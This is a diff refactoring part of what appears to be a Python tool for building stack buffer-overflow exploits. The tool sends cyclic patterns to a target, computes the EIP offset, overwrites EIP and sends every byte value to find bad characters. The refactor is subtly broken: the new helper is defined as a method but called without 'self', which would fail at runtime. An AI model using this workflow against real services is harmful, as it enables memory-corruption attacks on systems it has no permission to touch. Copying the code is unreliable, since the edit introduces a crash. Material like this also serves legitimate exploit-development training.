@@ -24,7 +24,7 @@ class Enum:
             print("[*] Pattern created\n")
 
             # Reset application
-            print("[!] Waiting for application to restart.\n")
+            print_restart_message()
             fuzz.is_target_up()
 
             # Send pattern to application to identify EIP overwrite
@@ -33,7 +33,7 @@ class Enum:
             # Get EIP value from user
             eip_query = input("[?] Enter EIP Value: ")
 
-            print("[!] Waiting for application to restart.\n")
+            print_restart_message()
             fuzz.is_target_up()
 
             # Determine EIP offset
@@ -46,13 +46,13 @@ class Enum:
         print("[*] Targeting EIP with all 'B's...\n")
         fuzz.send_payload("A" * offset + "B" * 4)
 
-        print("[!] Waiting for application to restart.\n")
+        print_restart_message()
         fuzz.is_target_up()
 
         print("[*] Sending all chars for bad char check...\n")
         fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())
 
-        print("[!] Waiting for application to restart.\n")
+        print_restart_message()
         fuzz.is_target_up()
 
         print("[*] Sending buffer + 4 * 'B' + 390 * 'C'\n")
@@ -68,3 +68,6 @@ class Enum:
         # Reverses result due to little endianness
         clear_text = bytearray.fromhex(eip_query).decode()[::-1]
         return self.pattern.find_offset(clear_text)
+    
+    def print_restart_message(self):
+        print("[!] Waiting for application to restart.\n")
